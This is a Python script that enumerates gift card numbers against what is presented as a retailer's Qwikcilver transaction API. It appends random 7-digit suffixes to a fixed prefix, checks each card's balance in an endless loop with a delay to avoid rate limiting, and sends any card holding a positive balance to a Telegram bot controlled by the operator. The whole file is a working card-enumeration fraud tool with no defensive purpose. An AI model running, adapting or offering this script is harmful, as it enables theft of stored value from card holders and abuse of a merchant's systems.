import requests
import random
import time

API_URL = "https://api.croma.com/qwikcilver/v1/transactions"
AUTH_TOKEN = "YOUR_AUTH_TOKEN_HERE"

PREFIX = "100134004"

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE"   
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

def send_to_telegram(message):
    """Send message to Telegram bot"""
    try:
        payload = {
            "chat_id": str(TELEGRAM_CHAT_ID),
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(TELEGRAM_API_URL, json=payload, timeout=5)
        if response.status_code == 200:
            print("✅ Message sent to Telegram")
        else:
            print(f"⚠️ Telegram Error {response.status_code}: {response.text}")
    except Exception as e:
        print(f"⚠️ Telegram Error: {str(e)}")

def generate_random_suffix():
    """Generate random 7-digit suffix to complete 16-digit card number"""
    return ''.join([str(random.randint(0, 9)) for _ in range(7)])

def check_card_balance(card_number):
    """Check balance for a specific card number"""
    payload = {
        "TransactionTypeId": 306,
        "InputType": "1",
        "Cards": [
            {
                "CardNumber": card_number
            }
        ]
    }

    headers = {
        "Authorization": f"Bearer {AUTH_TOKEN}",
        "Content-Type": "application/json"
    }

    try:
        response = requests.post(API_URL, json=payload, headers=headers)

        if response.status_code == 200:
            data = response.json()

            if data.get("ResponseCode") == 0 and data.get("Cards"):
                card = data["Cards"][0]

                balance = card.get("Balance", 0)
                status = card.get("CardStatus")

                # Always print all cards to terminal
                print("\n-----------------------")
                print("Card Number :", card_number)
                print("Status      :", status)
                print("Balance     : ₹", balance)
                print("-----------------------")

                # Send to Telegram ONLY if balance > 0
                if balance and float(balance) > 0:
                    telegram_message = (
                        f"<b>💳 CARD WITH BALANCE FOUND!</b>\n\n"
                        f"<b>Card Number:</b> {card_number}\n"
                        f"<b>Status:</b> {status}\n"
                        f"<b>Balance:</b> ₹ {balance}"
                    )
                    send_to_telegram(telegram_message)
                    return True  # Card with positive balance found

            else:
                # Uncomment for debugging
                # print(f"❌ API Error: {data.get('ResponseMessage')}")
                pass

        else:
            # print(f"❌ HTTP Error: {response.status_code}")
            pass

    except Exception as e:
        print(f"⚠️ Error: {str(e)}")
    
    return False

def run_loop(iterations=None):
    """Run card checking in a loop"""
    count = 0
    found = 0
    
    try:
        print("🔄 Starting card checking loop...")
        print(f"PREFIX: {PREFIX} (9 digits)")
        print("Generating random 7-digit suffixes...\n")
        
        while True:
            count += 1
            
            # Generate random suffix
            suffix = generate_random_suffix()
            card_number = PREFIX + suffix
            
            print(f"[{count}] Checking card: {card_number}...", end=" ")
            
            # Check the card
            if check_card_balance(card_number):
                found += 1
            
            # Optional: add delay to avoid rate limiting
            time.sleep(0.5)
            
            # If iterations is specified, stop after that many attempts
            if iterations and count >= iterations:
                print(f"\n✅ Completed {count} iterations. Found {found} valid cards.")
                break
                
    except KeyboardInterrupt:
        print(f"\n\n⏹️ Loop stopped by user.")
        print(f"Total checked: {count}")
        print(f"Cards found: {found}")

if __name__ == "__main__":
    # Run indefinitely (press Ctrl+C to stop)
    # Or specify number of iterations: run_loop(iterations=100)
    run_loop()